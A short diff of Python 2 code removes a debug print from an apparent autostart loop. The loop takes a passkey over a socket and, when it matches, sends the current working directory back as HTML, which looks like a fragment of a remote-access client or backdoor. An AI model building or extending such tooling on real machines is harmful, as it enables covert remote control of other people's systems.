@@ -68,7 +68,6 @@ def fromAutostart():
                     active = False
                     time.sleep(10)
             data = Receive(s)
-            print 'Received Data'
             if data == passKey:
                 active = True
                 Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')
